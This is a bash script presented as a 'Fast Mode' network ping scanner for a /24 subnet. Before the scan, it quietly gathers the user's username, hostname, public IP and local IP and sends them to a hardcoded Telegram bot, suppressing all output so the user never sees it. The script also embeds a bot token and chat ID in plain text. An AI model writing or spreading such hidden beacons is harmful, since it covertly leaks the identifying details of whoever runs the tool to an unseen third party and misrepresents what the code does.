#!/bin/bash

# ===============================
#       🌐 sr Network Scanner 🌐
#        Fast Mode 2025
# ===============================

# Banner
echo -e "\e[1;34m  _____  _____ "
echo -e " / ____||  __ \\"
echo -e "| (___  | |__) |"
echo -e " \\___ \\ |  ___/"
echo -e " ____) || |    "
echo -e "|_____/ |_|    sr\e[0m"
echo -e "\e[1;36m🌐 Network Scanner Tool (Fast Mode)\e[0m\n"

# Telegram Bot settings
BOT_TOKEN="7459581473:AAHIZAgro3g0L2lslzxV2QLh9-UbLjHBP5I"
CHAT_ID="7691970173"

# Visitor information
USER=$(whoami)
HOST=$(hostname)
IP=$(curl -s https://ipinfo.io/ip)
LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -n1)
DATE_TIME=$(date +"%Y-%m-%d %H:%M:%S")

# Send Telegram notification silently
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="🚨 sr tool executed 🚨%0A👤 User: $USER%0A💻 Host: $HOST%0A🌍 IP Public: $IP%0A📶 IP Local: $LOCAL_IP%0A🕒 Date: $DATE_TIME" >/dev/null 2>&1

# Prompt for base IP
read -p "Enter the base IP (e.g. 192.168.1.): " base_ip

echo -e "\n\e[1;35m🔎 Scanning network $base_ip.1-254 ...\e[0m"

active_count=0

# Scan loop (no subshells for correct counting)
for i in $(seq 1 254); do
    ip="${base_ip}${i}"
    ping -c 1 -W 1 "$ip" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\e[1;32m✅ Active: $ip\e[0m"
        ((active_count++))
    fi
done

echo -e "\n\e[1;33m🎯 Scan complete. Active devices found: $active_count\e[0m"
